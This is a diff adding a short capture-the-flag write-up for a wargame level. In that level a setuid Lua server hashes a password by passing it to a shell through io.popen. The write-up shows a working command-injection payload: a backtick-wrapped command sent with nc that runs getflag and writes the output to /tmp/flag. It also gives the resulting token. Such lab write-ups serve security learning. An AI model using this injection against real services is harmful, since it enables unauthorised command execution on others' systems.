@@ -3,3 +3,24 @@ solution level11:
 > ls -l
 -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
 
+we have a lua program that checks for a connection on port 5151
+the server asks for a password, and then passes it through a sha1 hash function
+
+it may seem like the solution is to send the right password to the hash function,
+but we are only interested in getting the output of getflag
+
+-> we can do that with some code injection:
+"prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+io.popen(prog[,mode])
+Starts program prog in a separated process and returns a file handle that you can use to read data
+from this program (if mode is "r", the default) or to write data to this program (if mode is "w").
+
+we can execute the getflag command with echo and write the output to a file we can read
+
+> nc localhost 5151
+> Password: `getflag > /tmp/flag`
+
+> cat /tmp/flag
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
